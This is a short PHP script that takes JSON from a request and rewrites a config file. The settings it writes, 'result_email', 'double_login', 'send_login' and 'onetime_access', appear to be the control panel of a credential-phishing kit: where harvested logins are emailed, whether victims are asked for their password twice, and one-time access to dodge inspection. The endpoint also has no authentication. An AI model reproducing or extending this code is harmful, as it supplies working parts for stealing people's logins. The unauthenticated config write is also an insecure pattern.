<?php
header('Content-Type: application/json');

$configFile = __DIR__ . '/config.php';
$current = require $configFile;

$data = json_decode(file_get_contents("php://input"), true);
if (!$data) {
    http_response_code(400);
    echo json_encode(["error" => "Invalid data"]);
    exit;
}

$newConfig = [
    "result_email" => $data["result_email"] ?? $current["result_email"],
    "parameter"    => $data["parameter"] ?? $current["parameter"],
    "onetime_access"    => (bool)($data["onetime_access"] ?? $current["onetime_access"]),
    "double_login"   => (bool)($data["double_login"] ?? $current["double_login"]),
    "send_login"   => (bool)($data["send_login"] ?? $current["send_login"]),
];

$export = "<?php\nreturn " . var_export($newConfig, true) . ";\n";
file_put_contents($configFile, $export);

echo json_encode(["success" => true]);
